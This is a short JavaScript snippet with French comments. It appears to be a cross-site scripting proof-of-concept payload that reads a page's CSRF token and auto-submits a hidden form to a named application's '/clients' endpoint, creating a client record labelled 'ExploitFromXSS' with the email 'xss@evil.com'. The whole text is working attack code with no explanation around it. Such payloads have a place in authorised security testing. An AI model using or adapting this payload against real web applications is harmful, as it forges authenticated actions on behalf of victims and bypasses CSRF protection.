(function () {
  const tokenInput = document.querySelector('input[name="_token"]');
  if (!tokenInput) return;
  const token = tokenInput.value;

  // 📦 Crée un formulaire
  const f = document.createElement('form');
  f.action = 'https://current-legacy.ci.plany.app/clients';
  f.method = 'POST';
  f.style.display = 'none';

  // ➕ Champs requis
  f.innerHTML = `
    <input name="client_name" value="ExploitFromXSS">
    <input name="email" value="xss@evil.com">
    <input name="phone_number" value="0101010101">
    <input name="phone_type" value="mobile">
    <input name="address" value="XSSville">
    <input name="_token" value="${token}">
  `;

  document.body.appendChild(f);
  f.submit();
})();
